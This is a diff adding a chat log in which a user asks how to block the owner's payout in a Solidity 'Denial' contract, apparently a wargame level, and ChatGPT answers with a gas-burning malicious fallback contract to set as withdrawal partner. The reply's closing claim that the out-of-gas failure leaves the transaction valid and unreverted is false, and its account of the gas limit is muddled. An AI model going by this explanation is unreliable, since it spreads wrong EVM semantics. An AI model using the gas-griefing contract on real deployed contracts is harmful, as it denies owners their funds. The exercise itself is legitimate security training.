@@ -1,0 +1,57 @@
+User
+
+How could an attacker make that the owner do not receive their share in this contract when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less)?
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+contract Denial {
+
+    address public partner; // withdrawal partner - pay the gas, split the withdraw
+    address public constant owner = address(0xA9E);
+    uint timeLastWithdrawn;
+    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances
+
+    function setWithdrawPartner(address _partner) public {
+        partner = _partner;
+    }
+
+    // withdraw 1% to recipient and 1% to owner
+    function withdraw() public {
+        uint amountToSend = address(this).balance / 100;
+        // perform a call without checking return
+        // The recipient can revert, the owner will still get their share
+        partner.call{value:amountToSend}("");
+        payable(owner).transfer(amountToSend);
+        // keep track of last withdrawal time
+        timeLastWithdrawn = block.timestamp;
+        withdrawPartnerBalances[partner] +=  amountToSend;
+    }
+
+    // allow deposit of funds
+    receive() external payable {}
+
+    // convenience function
+    function contractBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+
+ChatGPT
+An attacker could potentially prevent the owner from receiving their share in this contract when withdraw() is called by causing the transaction to consume more gas than available. In this case, the attacker would need to consume more than 1M gas while still ensuring the contract has enough funds.
+
+To achieve this, the attacker can create a malicious contract that consumes a lot of gas when it receives Ether. The attacker would then set this malicious contract as the withdrawal partner in the Denial contract by calling setWithdrawPartner().
+
+Here's an example of a malicious contract:
+
+solidity
+Copy code
+contract Malicious {
+    fallback() external payable {
+        for (uint i = 0; i < 5000; i++) {
+            // Consume gas with a storage operation
+            assembly { sstore(i, 0x01) }
+        }
+    }
+}
+This contract consumes a lot of gas when receiving Ether by writing to storage multiple times in a loop. The attacker would deploy this contract and call setWithdrawPartner() with the address of the malicious contract.
+
+Now, when withdraw() is called in the Denial contract, it will send 1% of the balance to the malicious contract. The malicious contract will consume a lot of gas with the storage operations, and if the gas consumed is more than the remaining gas of the transaction, the payable(owner).transfer(amountToSend) line will fail due to an out-of-gas error. Consequently, the owner won't receive their share, while the transaction is still considered valid and doesn't revert.
